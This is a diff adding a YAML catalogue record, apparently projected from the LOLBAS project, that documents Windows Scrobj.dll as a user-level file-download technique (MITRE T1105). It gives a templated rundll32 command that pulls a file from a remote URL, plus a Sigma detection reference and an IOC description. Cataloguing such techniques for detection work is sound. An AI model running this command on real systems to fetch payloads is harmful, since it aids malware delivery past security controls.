@@ -1,0 +1,93 @@
+id: lolbas/T1NMaWJyYXJpZXMvU2Nyb2JqLnltbA/RG93bmxvYWQ/0
+type: library
+platform: windows
+name: Scrobj.dll
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  triggers: Execution of rundll32.exe with 'GenerateTypeLib' and a protocol handler ('://') on the command
+    line
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
+commands:
+- template: rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}
+  comment: Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache.
+references:
+- https://lolbas-project.github.io/lolbas/Libraries/Scrobj/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Scrobj.dll
+      category: Download
+      privileges: User
+      mitre_id: T1105
+      source_file: OSLibraries/Scrobj.yml
+      command_source_index: 0
+      document_utf8: "---\nName: Scrobj.dll\nDescription: Windows Script Component Runtime\nAuthor: Eral4m\n\
+        Created: 2021-01-07\nCommands:\n  - Command: rundll32.exe C:\\Windows\\System32\\scrobj.dll,GenerateTypeLib\
+        \ {REMOTEURL:.exe}\n    Description: Once executed, scrobj.dll attempts to load a file from the\
+        \ URL and saves it to INetCache.\n    Usecase: Download file from remote location.\n    Category:\
+        \ Download\n    Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows 10, Windows\
+        \ 11\n    Tags:\n      - Download: INetCache\nFull_Path:\n  - Path: c:\\windows\\system32\\scrobj.dll\n\
+        \  - Path: c:\\windows\\syswow64\\scrobj.dll\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml\n\
+        \  - IOC: Execution of rundll32.exe with 'GenerateTypeLib' and a protocol handler ('://') on the\
+        \ command line\nResources:\n  - Link: https://twitter.com/eral4m/status/1479106975967240209\n\
+        Acknowledgement:\n  - Person: Eral4m\n    Handle: '@eral4m'\n"
+      document_sha256: sha256:21062104bd499df8e22549a74c00c2b9eb083b224d3bfe0cb2d584ab0de182ab
+    upstream_url: https://lolbas-project.github.io/lolbas/Libraries/Scrobj/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:a898a086a76a73c3aed1565bf48ff22f3c6ee6619444b1909c4cdaf144867258
